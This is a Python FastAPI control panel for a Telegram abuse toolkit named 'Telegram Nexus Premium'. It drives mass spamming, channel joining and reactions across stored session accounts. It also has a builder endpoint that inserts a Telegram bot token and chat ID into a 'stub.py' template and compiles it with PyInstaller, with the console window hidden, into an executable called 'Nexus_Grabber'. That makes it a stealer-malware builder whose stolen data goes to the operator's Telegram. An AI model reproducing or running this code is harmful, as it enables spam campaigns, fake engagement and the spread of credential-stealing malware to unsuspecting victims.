import os
import asyncio
import uuid
import shutil
import subprocess
from fastapi import FastAPI, Request, Form, BackgroundTasks, WebSocket, WebSocketDisconnect
from fastapi.responses import JSONResponse, FileResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel
from typing import List
from core import SESSIONS_DIR, get_sessions, log_msg, clients_log, patch_session_database
from tasks.reporter import run_report
from tasks.spammer import run_spammer
from tasks.joiner import run_joiner
from tasks.reactor import run_reaction

app = FastAPI(title="Telegram Nexus Premium")

# Инициализация окружения
for folder in ["static", SESSIONS_DIR]:
    if not os.path.exists(folder):
        os.makedirs(folder)

app.mount("/static", StaticFiles(directory="static"), name="static")



class SpamTask(BaseModel):
    target: str
    text: str
    accounts: List[str]
    delay: int
    loop: bool


class JoinTask(BaseModel):
    target: str
    accounts: List[str]


class ReactTask(BaseModel):
    target: str
    msg_id: int
    emoji: str


class BuildRequest(BaseModel):
    bot_token: str
    chat_id: str




@app.get("/")
async def get_index():
    return FileResponse("index.html")


@app.get("/api/sessions")
async def list_sessions():
    return get_sessions()


@app.delete("/api/sessions/{name}")
async def delete_session(name: str):
    path = os.path.join(SESSIONS_DIR, f"{name}.session")
    if os.path.exists(path):
        os.remove(path)
        return {"status": "deleted"}
    return JSONResponse(status_code=404, content={"message": "Not found"})


@app.post("/api/spam/run")
async def api_run_spam(data: SpamTask, background_tasks: BackgroundTasks):
    background_tasks.add_task(run_spammer, data.target, data.text, data.accounts, data.delay, data.loop)
    return {"status": "started"}


@app.post("/api/join/run")
async def api_run_joiner(data: JoinTask, background_tasks: BackgroundTasks):
    background_tasks.add_task(run_joiner, data.target, data.accounts)
    return {"status": "started"}


@app.post("/api/react/run")
async def api_run_reactor(data: ReactTask, background_tasks: BackgroundTasks):
    background_tasks.add_task(run_reaction, data.target, data.msg_id, data.emoji)
    return {"status": "started"}


@app.post("/api/build")
async def api_build_exe(data: BuildRequest):
    build_id = str(uuid.uuid4())[:8]
    temp_py = f"temp_{build_id}.py"
    exe_name = f"Nexus_Grabber_{build_id}"

    if not os.path.exists("stub.py"):
        return JSONResponse(status_code=500, content={"message": "stub.py not found"})

    try:
        with open("stub.py", "r", encoding="utf-8") as f:
            content = f.read()

        content = content.replace("{{BOT_TOKEN}}", data.bot_token).replace("{{CHAT_ID}}", data.chat_id)

        with open(temp_py, "w", encoding="utf-8") as f:
            f.write(content)


        process = subprocess.run([
            "pyinstaller", "--onefile", "--noconsole", "--clean",
            f"--name={exe_name}", f"--distpath={os.path.abspath('static')}", temp_py
        ], capture_output=True)


        if os.path.exists(temp_py): os.remove(temp_py)
        spec_file = f"{exe_name}.spec"
        if os.path.exists(spec_file): os.remove(spec_file)
        if os.path.exists("build"): shutil.rmtree("build")

        return {"status": "ok", "url": f"/static/{exe_name}.exe"}
    except Exception as e:
        return JSONResponse(status_code=500, content={"message": str(e)})


@app.websocket("/ws/logs")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    clients_log.append(websocket)
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        clients_log.remove(websocket)


if __name__ == "__main__":
    import uvicorn

    uvicorn.run(app, host="127.0.0.1", port=8000)